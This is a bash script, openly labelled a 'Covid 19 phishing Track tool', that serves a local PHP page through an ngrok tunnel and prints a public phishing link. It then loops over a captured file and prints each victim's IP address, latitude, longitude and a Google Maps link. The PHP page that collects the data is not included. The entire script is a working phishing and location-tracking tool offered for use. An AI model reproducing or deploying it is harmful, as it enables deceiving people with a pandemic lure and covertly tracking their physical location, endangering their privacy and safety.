#!/bin/bash 
clear

echo ""

echo -e "\e[1;36m     
⣿⡇⣿⣿⣿⠛⠁⣴⣿⡿⠿⠧⠹⠿⠘⣿⣿⣿⡇⢸⡻⣿⣿⣿⣿⣿⣿⣿
⢹⡇⣿⣿⣿⠄⣞⣯⣷⣾⣿⣿⣧⡹⡆⡀⠉⢹⡌⠐⢿⣿⣿⣿⡞⣿⣿⣿
⣾⡇⣿⣿⡇⣾⣿⣿⣿⣿⣿⣿⣿⣿⣄⢻⣦⡀⠁⢸⡌⠻⣿⣿⣿⡽⣿⣿
⡇⣿⠹⣿⡇⡟⠛⣉⠁⠉⠉⠻⡿⣿⣿⣿⣿⣿⣦⣄⡉⠂⠈⠙⢿⣿⣝⣿
⠤⢿⡄⠹⣧⣷⣸⡇⠄⠄⠲⢰⣌⣾⣿⣿⣿⣿⣿⣿⣶⣤⣤⡀⠄⠈⠻⢮
⠄⢸⣧⠄⢘⢻⣿⡇⢀⣀⠄⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠄⢀
⠄⠈⣿⡆⢸⣿⣿⣿⣬⣭⣴⣿⣿⣿⣿⣿⣿⣿⣯⠝⠛⠛⠙⢿⡿⠃⠄⢸
⠄⠄⢿⣿⡀⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⡾⠁⢠⡇⢀
⠄⠄⢸⣿⡇⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⣫⣻⡟⢀⠄⣿⣷⣾
⠄⠄⢸⣿⡇⠄⠈⠙⠿⣿⣿⣿⣮⣿⣿⣿⣿⣿⣿⣿⣿⡿⢠⠊⢀⡇⣿⣿
⠒⠤⠄⣿⡇⢀⡲⠄⠄⠈⠙⠻⢿⣿⣿⠿⠿⠟⠛⠋⠁⣰⠇⠄⢸⣿⣿⣿
⠄⠄⠄⣿⡇⢬⡻⡇⡄⠄⠄⠄⡰⢖⠔⠉⠄⠄⠄⠄⣼⠏⠄⠄⢸⣿⣿⣿
⠄⠄⠄⣿⡇⠄⠙⢌⢷⣆⡀⡾⡣⠃⠄⠄⠄⠄⠄⣼⡟⠄⠄⠄⠄⢿⣿⣿

"
echo ""
echo -e "\e[5;32m      ( Covid 19 phishing Track tool  )"; sleep 1
echo ""
echo -e "\e[1;32m  ________________ Code By Ad A M ________________ ";sleep 1
echo ""


echo ""
echo -e "\e[1;31m Wait, Ngrok Link is being created";sleep 1
echo "" 
read -p "Enter Port ::  " p 
cd file 

php -S 127.0.0.1:$p > /dev/null 2>&1 &
cd ..
sleep 3

./ngrok http $p > /dev/null 2>&1 &
sleep 8
url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
echo ""

echo -e "\e[1;32m  Your  Location Phishing Link :: #==> $url  "
cd file
while [ true ];do
if [[ -e "pyae.txt" ]];then
echo ""
ip=$(grep -o 'ip:.*' pyae.txt | cut -d " " -f2)
lat=$(grep -o 'lat:.*' pyae.txt | cut -d " " -f2)
lot=$(grep -o 'lon:.*' pyae.txt | cut -d " " -f2)
echo -e "\e[1;31m user Information "
echo ""
echo -e "\e[1;32m Tager IP addres #==> :: $ip"
echo ""
echo -e "\e[1;32m Tager latitude #==> :: $lat"
echo ""
echo -e "\e[1;32m Tager longitude #==> :: $lot"
echo ""
echo -e "\e[1;32m Google map #==> ::  https://www.google.com/maps/place/$lat$lot"
rm pyae.txt 
fi 
done
